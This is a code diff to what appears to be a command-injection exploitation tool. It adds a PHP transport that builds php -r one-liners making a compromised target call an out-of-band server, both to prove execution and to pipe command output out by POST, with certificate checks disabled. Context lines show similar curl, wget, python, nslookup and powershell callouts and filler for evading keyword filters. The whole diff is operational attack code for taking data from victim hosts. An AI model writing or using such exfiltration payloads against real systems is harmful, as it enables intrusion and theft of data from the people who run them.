@@ -36,7 +36,12 @@ PLUS = "+"
 """
 The HTTP clients used to reach the out-of-band server, most common first.
 """
-UNIX_TRANSPORTS = ["curl", "wget", "python", "dns"]
+UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php"]
+# Clients worth asking for, but not on every boundary of the sweep: each one there costs a request
+# per boundary, and a target either has a client or it does not - which is not a thing a boundary
+# changes. They are asked once a boundary is confirmed, where a target without the common ones still
+# needs something that carries output back whole rather than a name at a time.
+FALLBACK_TRANSPORTS = ("php",)
 # 'curl.exe' leads on Windows, where it has shipped in System32 since Windows 10 1803: unlike a
 # name lookup it carries command output back, and it is quick to give up where a host has no way
 # out. A lookup follows, present on every Windows and the one confirmed against a real target.
@@ -77,6 +82,25 @@ def _python_prog(hostname, from_stdin=False, proof=""):
           "urllib.request.urlopen('" + _url(hostname, proof) + "'" + body + ")\"")
 
 """
+Build the PHP program a payload runs, reading its body from stdin when a command is being sent.
+
+A target reached over HTTPS is usually one whose PHP has no CA store to check it against, and a
+failure there costs the whole transport, so verification is turned off - the body is still
+encrypted. Written with 'array()' rather than the short form, which PHP older than 5.4 cannot read.
+"""
+def _php_prog(hostname, from_stdin=False, proof=""):
+  options = []
+  if from_stdin:
+    options.append("'http'=>array('method'=>'POST','content'=>file_get_contents('php://stdin'))")
+  if (settings.OOB_SCHEME or "https") == "https":
+    options.append("'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false)")
+  context = ""
+  if options:
+    context = ",false,stream_context_create(array(" + ",".join(options) + "))"
+  # The program is inside double quotes, so the shell still does the sum before PHP sees the URL.
+  return "php -r \"file_get_contents('" + _url(hostname, proof) + "'" + context + ");\""
+
+"""
 Build the command that makes the target contact a hostname, carrying a sum for it to evaluate.
 """
 def reach_command(transport, hostname, proof="", separator=OR):
@@ -86,6 +110,8 @@ def reach_command(transport, hostname, proof="", separator=OR):
     return "wget -qO- " + _url(hostname, proof)
   if transport == "python":
     return _python_prog(hostname, proof=proof)
+  if transport == "php":
+    return _php_prog(hostname, proof=proof)
   if transport == "dns":
     # Resolving the name is enough to prove execution, and needs no HTTP client at all.
     return dns_lookup_command(hostname, separator)
@@ -177,7 +203,8 @@ def transport_of(payload):
   # filler between a word's letters to dodge keyword filters, which splits a marker apart - strip
   # that filler back out before looking for one.
   normalized = re.sub(r'""|\^|\\|\$@', "", payload)
-  for transport, marker in (("python", "urllib.request"), ("dns", "nslookup"), ("curl", "curl"),
+  for transport, marker in (("python", "urllib.request"), ("php", "file_get_contents"),
+                            ("dns", "nslookup"), ("curl", "curl"),
                             ("wget", "wget"), ("powershell", "powershell")):
     if marker in normalized:
       return transport
@@ -191,6 +218,10 @@ def transports():
   if settings.OOB_TRANSPORT:
     return [settings.OOB_TRANSPORT]
   order = list(WINDOWS_TRANSPORTS) if settings.TARGET_OS == settings.OS.WINDOWS else list(UNIX_TRANSPORTS)
+  # Left out of the per-boundary sweep: the sweep costs a request per boundary per transport, and
+  # whether a target has one of these is not something a boundary changes. They are asked once a
+  # boundary is confirmed instead, through 'upgrade_candidates()'.
+  order = [candidate for candidate in order if candidate not in FALLBACK_TRANSPORTS]
   if menu.options.interpreter and "python" in order:
     order.remove("python")
     order.insert(0, "python")
@@ -269,7 +300,7 @@ def heuristic_payload(channel, target_os):
 Report whether a transport can carry a computation the receiving end can check.
 """
 def supports_proof(transport):
-  return transport in ("curl", "wget", "python", "powershell")
+  return transport in ("curl", "wget", "python", "powershell", "php")
 
 """
 Build a sum for the target to evaluate, returned as (expression, expected result, prologue). The
@@ -323,7 +354,7 @@ def proof(transport, plus=PLUS):
 Report whether a transport can carry command output back.
 """
 def supports_exfiltration(transport):
-  return transport in ("curl", "wget", "python", "powershell", "dns")
+  return transport in ("curl", "wget", "python", "powershell", "dns", "php")
 
 """
 Hex characters per label, so a name stays inside the 253 bytes a DNS query has for it. Even, so a
@@ -409,6 +440,8 @@ def exfil_command(transport, hostname, cmd, pipe=PIPE, separator=""):
     return "wget -qO- --post-data=\"$" + grouped + "\" " + _url(hostname)
   if transport == "python":
     return grouped + pipe + _python_prog(hostname, from_stdin=True)
+  if transport == "php":
+    return grouped + pipe + _php_prog(hostname, from_stdin=True)
   if transport == "powershell":
     # Out-String joins the lines into one body.
     return ("powershell.exe -c iwr -Uri " + _url(hostname) + " -Method POST -Body "
